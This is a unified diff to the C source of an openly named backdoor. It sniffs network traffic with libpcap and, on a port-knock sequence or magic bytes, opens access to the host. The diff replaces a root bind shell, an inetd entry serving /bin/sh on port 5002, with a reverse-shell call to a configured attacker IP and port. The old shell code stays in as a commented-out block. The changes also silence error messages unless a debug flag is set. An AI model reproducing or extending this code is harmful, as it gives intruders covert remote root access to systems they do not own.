@@ -1,5 +1,6 @@
 #include "backdoor_utils.h"
 #include "utils.h"
+#include "../include/attacks.h"
 
 #include <stdio.h>
 #include <sys/types.h>
@@ -56,7 +57,7 @@ void create_deamon_process(char *cdr_noise_command) {
     struct bpf_program      cfilter;                    /* the compiled filter */
     struct iphdr            *ip;
     struct tcphdr           *tcp;
-    u_char                  *pdata;
+    unsigned char           *pdata;
     char                    *filter;
     int                     cdr_noise = 0;
 
@@ -65,18 +66,26 @@ void create_deamon_process(char *cdr_noise_command) {
         if(!strcmp(cdr_noise_command, CDR_NOISE_COMMAND)) {
             cdr_noise++;
         } else {
+            #ifdef DEBUG
+                fprintf(stderr, "%s is not an acceptable command line arg\n", cdr_noise_command);
+            #endif
             exit(0);
         }
     }
+
+    /* If no activation method is supplied, exit */
+#if (!defined(CDR_PORTS) || !defined(CDR_PORTS_SIZE) || !defined(PORT_KNOCK_LIST)) && !defined(MAGIC_PORT_STRING)
+#ifdef DEBUG
+    fprintf(stderr, "No activation method selected\n");
+#endif
+    exit(0);
+#endif
     
-#ifdef PORT_KNOCK_LIST
+    /* If CDR_PORTS and CDR_PORTS_SIZE are defined, it sets up port knocking */
+#if defined(CDR_PORTS) && defined(CDR_PORTS_SIZE) && defined(PORT_KNOCK_LIST)
     unsigned int 	    cports[] = CDR_PORTS;
-    int		            cportcnt = 0;
+    int		            cportcnt = CDR_PORTS_SIZE;
     int		            actport = 0;
-
-    while (cports[cportcnt++]);
-    cportcnt--; 
-
 
     filter = set_port_knock_list_filter(cports, cportcnt);
 #endif
@@ -88,6 +97,7 @@ void create_deamon_process(char *cdr_noise_command) {
     if (pcap_lookupnet(CDR_INTERFACE,&network,&netmask,pcap_err)!=0) {
 	    if (cdr_noise)
 	        fprintf(stderr,"pcap_lookupnet: %s\n",pcap_err);
+        free(filter);
 	    exit (0);
     }
 
@@ -98,6 +108,7 @@ void create_deamon_process(char *cdr_noise_command) {
 		    pcap_err))==NULL) {
 	    if (cdr_noise)
 	        fprintf(stderr,"pcap_open_live: %s\n",pcap_err);
+        free(filter);
 	    exit (0);
     }
 
@@ -105,16 +116,19 @@ void create_deamon_process(char *cdr_noise_command) {
     if (pcap_compile(cap,&cfilter,filter,0,netmask)!=0) {
         if (cdr_noise) 
             capterror(cap,"pcap_compile");
+        free(filter);
         exit (0);
     }
     if (pcap_setfilter(cap,&cfilter)!=0) {
         if (cdr_noise)
             capterror(cap,"pcap_setfilter");
+        free(filter);
         exit (0);
     }
 
     /* the filter is set - let's free the base string*/
     free(filter);
+    filter = NULL;
 
     /* allocate a packet header structure */
     phead=(struct pcap_pkthdr *)smalloc(sizeof(struct pcap_pkthdr));
@@ -148,7 +162,7 @@ void create_deamon_process(char *cdr_noise_command) {
 
     for(;;) {
         /* if there is no 'next' packet in time, continue loop */
-        if ((pdata=(u_char *)pcap_next(cap,phead))==NULL) continue;
+        if ((pdata=(unsigned char *)pcap_next(cap,phead))==NULL) continue;
         /* if the packet is to small, continue loop */
         if (phead->len<=(ETHLENGTH+IP_MIN_LENGTH)) continue; 
         
@@ -185,43 +199,11 @@ void create_deamon_process(char *cdr_noise_command) {
 }
 
 void cdr_open_door(void) {
-#ifndef DEBUG
-    FILE	*f;
-
-    char	*args[] = {"/usr/sbin/inetd","/tmp/.ind",NULL};
-
-    
-    switch (fork()) {
-	case -1: 
-        #ifdef DEBUG
-            printf("fork() failed ! Fuck !\n");
-        #endif
-	    return;
-	case 0: 
-	    /* To prevent zombies (inetd-zombies look quite stupid) we do
-	     * a second fork() */
-	    switch (fork()) {
-		case -1: _exit(0);
-		case 0: /*that's fine */
-			 break;
-		default: _exit(0);
-	    }
-	     break;
-
-	default: 
-	     wait(NULL);
-	     return;
-    }
-
-    if ((f=fopen("/tmp/.ind","a+t"))==NULL) return;
-    fprintf(f,"5002  stream  tcp     nowait  root    /bin/sh  sh\n");
-    fclose(f);
-
-    execv("/usr/sbin/inetd",args);
-    #ifdef DEBUG
-        printf("Strange return from execvp() !\n");
-    #endif
-    exit (0);
+#if defined(REVERSE_SHELL) && defined(REVERSE_IP) && defined(REVERSE_PORT) && defined(DELAY_TIME)
+    char *rev_ip = REVERSE_IP;
+    uint16_t rev_port = REVERSE_PORT;
+    unsigned int seconds = DELAY_TIME;
+    rev_shell(rev_ip, rev_port, seconds);
 #endif
     LOG("Backdoor opened\n");
 }
@@ -264,7 +246,7 @@ void open_backdoor_via_magic_bytes(struct tcphdr *tcp, struct iphdr *ip) {
         cdr_open_door();
     }
 
-    capture_command_after_magic_bytes(data);
+    //capture_command_after_magic_bytes(data);
 }
 
 char* set_port_knock_list_filter(unsigned int cports[], int cportcnt) {
@@ -339,7 +321,9 @@ unsigned char *base64_decode(unsigned char *input, int *out_len) {
     
     unsigned char *buffer = (unsigned char *)malloc(input_len);
     if (!buffer) {
+        #ifdef DEBUG
         printf("Memory allocation failed!\n");
+        #endif
         exit(1);
     }
 
@@ -353,3 +337,41 @@ unsigned char *base64_decode(unsigned char *input, int *out_len) {
 
     return buffer;
 }
+
+
+    // FILE	*f;
+
+    // char	*args[] = {"/usr/sbin/inetd","/tmp/.ind",NULL};
+
+    
+    // switch (fork()) {
+	// case -1: 
+    //     #ifdef DEBUG
+    //         printf("fork() failed ! Fuck !\n");
+    //     #endif
+	//     return;
+	// case 0: 
+	//     /* To prevent zombies (inetd-zombies look quite stupid) we do
+	//      * a second fork() */
+	//     switch (fork()) {
+	// 	case -1: _exit(0);
+	// 	case 0: /*that's fine */
+	// 		 break;
+	// 	default: _exit(0);
+	//     }
+	//      break;
+
+	// default: 
+	//      wait(NULL);
+	//      return;
+    // }
+
+    // if ((f=fopen("/tmp/.ind","a+t"))==NULL) return;
+    // fprintf(f,"5002  stream  tcp     nowait  root    /bin/sh  sh\n");
+    // fclose(f);
+
+    // execv("/usr/sbin/inetd",args);
+    // #ifdef DEBUG
+    //     printf("Strange return from execvp() !\n");
+    // #endif
+    // exit (0);
